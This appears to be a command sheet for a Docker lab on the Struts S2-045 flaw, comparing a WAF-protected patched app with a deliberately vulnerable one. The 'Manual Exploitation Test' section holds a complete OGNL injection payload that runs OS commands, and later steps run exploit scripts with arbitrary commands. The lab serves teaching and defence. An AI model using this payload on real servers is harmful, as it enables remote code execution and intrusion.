# Testing Commands for S2-045 Lab

## Quick Start - Build and Run

```bash
# Build all containers
docker compose build

# Start defense lab (nginx + patched app)
docker compose up -d nginx app

# Start vulnerable app
docker compose up -d app-vulnerable

# Check all services are running
docker compose ps
```

## Test Defense Lab (Port 8080)

### 1. Health Check
```bash
curl http://127.0.0.1:8080/struts-lab/health
```

### 2. Legitimate File Upload
```bash
# Create a test file
echo "test content" > /tmp/test.txt

# Upload it
curl -X POST -F "upload=@/tmp/test.txt" http://127.0.0.1:8080/struts-lab/upload
```

### 3. Test WAF Blocking (Suspicious Content-Type)
```bash
# This should be blocked by WAF
curl -v -X POST \
  -H "Content-Type: multipart/form-data; boundary=----SUSPICIOUS%{test}" \
  -F "upload=@/tmp/test.txt" \
  http://127.0.0.1:8080/struts-lab/upload
```

### 4. Run Attack Simulator
```bash
docker compose run --rm simulator
```

## Test Vulnerable App (Port 8081)

### 1. Health Check
```bash
curl http://127.0.0.1:8081/struts-lab/health
```

### 2. Legitimate File Upload
```bash
curl -X POST -F "upload=@/tmp/test.txt" http://127.0.0.1:8081/struts-lab/upload
```

### 3. Manual Exploitation Test
```bash
# Test with a simple OGNL payload (whoami command)
curl -X POST \
  -H "Content-Type: %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}" \
  -F "upload=@/dev/null" \
  http://127.0.0.1:8081/struts-lab/upload
```

## Run Exploit Container

### Option 1: Bash Script (Full Demo)
```bash
docker compose --profile exploit run --rm exploit
```

### Option 2: Python Script (Custom Command)
```bash
# Execute 'whoami'
docker compose run --rm exploit python3 exploit.py \
  http://app-vulnerable:8080/struts-lab 'whoami'

# Execute 'id'
docker compose run --rm exploit python3 exploit.py \
  http://app-vulnerable:8080/struts-lab 'id'

# Execute 'pwd'
docker compose run --rm exploit python3 exploit.py \
  http://app-vulnerable:8080/struts-lab 'pwd'
```

### Option 3: Run Scripts Directly (from host)
```bash
# Bash script
./exploit/demo_exploit.sh

# Python script
python3 exploit/exploit.py http://127.0.0.1:8081/struts-lab 'whoami'
```

## View Logs

### Defense Lab Logs
```bash
# Nginx access logs
tail -f logs/nginx/access.log

# Nginx error logs (WAF blocks)
tail -f logs/nginx/error.log

# Application logs
tail -f logs/app/struts-lab.log

# Security logs
tail -f logs/app/security.log
```

### Vulnerable App Logs
```bash
# Application logs
tail -f logs/app-vulnerable/struts-lab.log
```

### All Logs Combined
```bash
# Docker compose logs
docker compose logs -f

# Specific service
docker compose logs -f app-vulnerable
docker compose logs -f nginx
```

## Comparison Test

### Test 1: Same Request to Both Apps
```bash
# Create test payload
PAYLOAD="multipart/form-data; boundary=----TEST%{test}"

# Defense lab (should be blocked)
echo "=== Defense Lab (Port 8080) ==="
curl -s -o /dev/null -w "HTTP %{http_code}\n" -X POST \
  -H "Content-Type: $PAYLOAD" \
  -F "upload=@/dev/null" \
  http://127.0.0.1:8080/struts-lab/upload

# Vulnerable app (may process or error)
echo "=== Vulnerable App (Port 8081) ==="
curl -s -o /dev/null -w "HTTP %{http_code}\n" -X POST \
  -H "Content-Type: $PAYLOAD" \
  -F "upload=@/dev/null" \
  http://127.0.0.1:8081/struts-lab/upload
```

## Cleanup

```bash
# Stop all containers
docker compose down

# Stop and remove volumes
docker compose down -v

# Full cleanup (including images)
docker compose down --rmi all -v

# Remove logs
rm -rf logs/
```

## Troubleshooting

### Check if services are running
```bash
docker compose ps
```

### Check service health
```bash
# Defense lab
curl http://127.0.0.1:8080/struts-lab/health | jq

# Vulnerable app
curl http://127.0.0.1:8081/struts-lab/health | jq
```

### Rebuild specific service
```bash
# Rebuild vulnerable app
docker compose build app-vulnerable
docker compose up -d app-vulnerable

# Rebuild defense app
docker compose build app
docker compose up -d app
```

### View container logs
```bash
# Vulnerable app logs
docker compose logs app-vulnerable

# Defense app logs
docker compose logs app

# Nginx logs
docker compose logs nginx
```

